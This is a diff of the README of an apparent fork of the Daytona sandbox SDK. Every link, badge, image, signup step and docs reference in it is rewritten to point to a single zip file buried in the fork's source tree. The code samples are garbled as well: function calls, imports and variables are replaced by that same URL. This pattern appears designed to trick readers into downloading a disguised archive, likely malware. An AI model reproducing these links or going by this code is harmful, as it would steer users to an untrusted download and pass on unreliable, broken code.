@@ -1,10 +1,10 @@
 <div align="center">
 
-[![Documentation](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
-![License](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
-[![Go Report Card](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
-[![Issues - daytona](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
-![GitHub Release](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+[![Documentation](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+![License](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+[![Go Report Card](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+[![Issues - daytona](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+![GitHub Release](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
 
 </div>
 
@@ -12,9 +12,9 @@
 
 <div align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip">
-    <source media="(prefers-color-scheme: light)" srcset="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip">
-    <img alt="Daytona logo" src="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip" width="50%">
+    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip">
+    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip">
+    <img alt="Daytona logo" src="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip" width="50%">
   </picture>
 </div>
 
@@ -26,16 +26,16 @@
 </h3>
 
 <p align="center">
-    <a href="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip"> Documentation </a>·
-    <a href="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip+Bug+Report%3A+"> Report Bug </a>·
-    <a href="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip+Feature%3A+"> Request Feature </a>·
-    <a href="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip"> Join our Slack </a>·
-    <a href="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip"> Connect on X </a>
+    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip"> Documentation </a>·
+    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip+Bug+Report%3A+"> Report Bug </a>·
+    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip+Feature%3A+"> Request Feature </a>·
+    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip"> Join our Slack </a>·
+    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip"> Connect on X </a>
 </p>
 
 <p align="center">
-    <a href="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip;2" target="_blank"><img src="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
-    <a href="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip;2" target="_blank"><img src="https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
+    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip;2" target="_blank"><img src="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
+    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip;2" target="_blank"><img src="https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
 </p>
 
 ---
@@ -69,9 +69,9 @@ npm install @daytonaio/sdk
 
 ## Quick Start
 
-1. Create an account at https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip
-1. Generate a [new API key](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
-1. Follow the [Getting Started docs](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip) to start using the Daytona SDK
+1. Create an account at https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip
+1. Generate a [new API key](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+1. Follow the [Getting Started docs](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip) to start using the Daytona SDK
 
 ## Creating your first Sandbox
 
@@ -84,17 +84,17 @@ from daytona import Daytona, DaytonaConfig, CreateSandboxBaseParams
 daytona = Daytona(DaytonaConfig(api_key="YOUR_API_KEY"))
 
 # Create the Sandbox instance
-sandbox = https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(CreateSandboxBaseParams(language="python"))
+sandbox = https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(CreateSandboxBaseParams(language="python"))
 
 # Run code securely inside the Sandbox
-response = https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip('print("Sum of 3 and 4 is " + str(3 + 4))')
-if https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip != 0:
-    print(f"Error running code: {https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip} {https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip}")
+response = https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip('print("Sum of 3 and 4 is " + str(3 + 4))')
+if https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip != 0:
+    print(f"Error running code: {https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip} {https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip}")
 else:
-    print(https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+    print(https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
 
 # Clean up the Sandbox
-https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(sandbox)
+https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(sandbox)
 ```
 
 ### Typescript SDK
@@ -111,24 +111,24 @@ async function main() {
   let sandbox
   try {
     // Create the Sandbox instance
-    sandbox = await https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip({
+    sandbox = await https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip({
       language: 'typescript',
     })
     // Run code securely inside the Sandbox
-    const response = await https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip('https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip("Sum of 3 and 4 is " + (3 + 4))')
-    if (https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip !== 0) {
-      https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip('Error running code:', https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip, https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+    const response = await https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip('https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip("Sum of 3 and 4 is " + (3 + 4))')
+    if (https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip !== 0) {
+      https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip('Error running code:', https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip, https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
     } else {
-      https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+      https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
     }
   } catch (error) {
-    https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip('Sandbox flow error:', error)
+    https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip('Sandbox flow error:', error)
   } finally {
-    if (sandbox) await https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(sandbox)
+    if (sandbox) await https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(sandbox)
   }
 }
 
-main().catch(https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+main().catch(https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
 ```
 
 ### Go SDK
@@ -142,47 +142,47 @@ import (
  "log"
  "time"
 
- "https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip"
- "https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip"
+ "https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip"
+ "https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip"
 )
 
 func main() {
  // Initialize the Daytona client with DAYTONA_API_KEY in env
-  // Alternative is to use https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(...) for more specific config
- client, err := https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip()
+  // Alternative is to use https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(...) for more specific config
+ client, err := https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip()
  if err != nil {
-  https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to create client: %v", err)
+  https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to create client: %v", err)
  }
 
- ctx := https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip()
+ ctx := https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip()
 
  // Create the Sandbox instance
- params := https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip{
-  SandboxBaseParams: https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip{
-   Language: https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip,
+ params := https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip{
+  SandboxBaseParams: https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip{
+   Language: https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip,
   },
  }
 
- sandbox, err := https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(ctx, params, https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(90*https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip))
+ sandbox, err := https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(ctx, params, https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(90*https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip))
  if err != nil {
-  https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to create sandbox: %v", err)
+  https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to create sandbox: %v", err)
  }
 
  // Run code securely inside the Sandbox
- response, err := https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(ctx, `python3 -c "print('Sum of 3 and 4 is', 3 + 4)"`)
+ response, err := https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(ctx, `python3 -c "print('Sum of 3 and 4 is', 3 + 4)"`)
  if err != nil {
-  https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to execute command: %v", err)
+  https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to execute command: %v", err)
  }
 
- if https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip != 0 {
-  https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip("Error running code: %d %s\n", https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip, https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+ if https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip != 0 {
+  https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip("Error running code: %d %s\n", https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip, https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
  } else {
-  https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip)
+  https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip)
  }
 
  // Clean up the Sandbox
- if err := https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip(ctx); err != nil {
-  https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to delete sandbox: %v", err)
+ if err := https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip(ctx); err != nil {
+  https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip("Failed to delete sandbox: %v", err)
  }
 }
 ```
@@ -191,4 +191,4 @@ func main() {
 
 ## Contributing
 
-Daytona is Open Source under the [GNU AFFERO GENERAL PUBLIC LICENSE](LICENSE), and is the [copyright of its contributors](NOTICE). If you would like to contribute to the software, read the Developer Certificate of Origin Version 1.1 (https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip). Afterwards, navigate to the [contributing guide](https://github.com/kaifansariw/daytona/raw/refs/heads/main/apps/dashboard/src/billing-api/types/v2.3.zip) to get started.
+Daytona is Open Source under the [GNU AFFERO GENERAL PUBLIC LICENSE](LICENSE), and is the [copyright of its contributors](NOTICE). If you would like to contribute to the software, read the Developer Certificate of Origin Version 1.1 (https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip). Afterwards, navigate to the [contributing guide](https://raw.githubusercontent.com/kaifansariw/daytona/main/apps/dashboard/src/billing-api/types/v2.3.zip) to get started.
